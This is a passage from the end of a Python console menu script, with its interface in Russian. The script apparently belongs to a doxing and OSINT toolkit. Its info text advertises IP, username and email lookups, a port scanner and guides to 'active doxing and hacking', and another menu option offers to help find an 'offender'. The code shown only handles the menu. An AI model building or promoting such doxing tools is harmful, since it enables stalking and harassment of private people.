                \n''', pystyle.Colors.green_to_red, interval=0.005)    

            if choice == "INFO":
                pystyle.Write.Print('''\n[+] [+] Инфа: ТГ: @MarginalDeveloper. Хочу отметить, что за содержание ниже ни в коем случае не отвечаю. Это гайд от создателя скрипта(к сожалению не нашел его), который я лишь доработал.
                                    Вот что было добавлено с моей стороны: 
                      -  Более подробный поиск по IP и добавление программы для поиска по IP.
                      -  Расширенное количество ссылок и подробный поиск по юзернейму.
                      -  Актуализация гайда на Доксинг, замена информации на свою.
                      -  Добавление программы на Порт сканнер.
                      -  Ваши собственные гайды на активный доксинг и взлом.
                      -  Добавление поиска по почте.               
                             Выражаю благодарность создателю данного скрипта, он проделал существенную работу                              
                                     \n''', pystyle.Colors.green_to_red, interval = 0.005)
            if choice == "55":
                pystyle.Write.Print("\n[+]🕵️‍♀️  Ищешь обидчика? Хочешь сайт, приложение или бота в Telegram? Пиши мне! @marginalDeveloper \n", pystyle.Colors.green_to_red, interval = 0.005)
            if choice == "23":
                sure = pystyle.Write.Input("Вы действительно хотите выйти? Y/N -> ", pystyle.Colors.green_to_red, interval = 0.005)
                if sure.lower() == "y" or sure.lower() == "yes" or sure.lower() == "н" or sure.lower() == "нуы" or sure.lower() == "да" or sure.lower() == "lf":
                    sys.exit()
                else:
                    continue
            pystyle.Write.Input("\n[?] Нажмите Enter для продолжения", pystyle.Colors.green_to_red, interval = 0.005)
            Main()
    except Exception as e:
        print("[!] Произошла ошибка ->", e)